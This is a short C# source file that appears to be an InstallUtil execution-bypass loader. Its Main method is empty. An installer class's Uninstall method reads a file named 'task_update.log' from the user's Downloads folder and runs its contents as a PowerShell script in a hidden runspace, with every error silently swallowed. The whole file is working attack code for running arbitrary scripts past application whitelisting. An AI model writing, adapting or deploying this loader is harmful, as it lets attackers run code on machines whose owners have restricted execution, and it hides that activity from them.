using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
{
    public static void Main()
    {
    }
}

[System.ComponentModel.RunInstaller(true)]
public class CustomInstaller : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        PowerShellExecutor.ExecuteScript();
    }
}

public class PowerShellExecutor
{
    public static void ExecuteScript()
    {
        try
        {
            string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
            string scriptFile = Path.Combine(downloadsPath, "task_update.log");
            
            if (File.Exists(scriptFile))
            {
                string command = File.ReadAllText(scriptFile);
                using (Runspace runspace = RunspaceFactory.CreateRunspace(InitialSessionState.CreateDefault()))
                {
                    runspace.Open();
                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        pipeline.Commands.AddScript(command);
                        pipeline.Invoke();
                    }
                }
            }
        }
        catch
        {
           
        }
    }
}
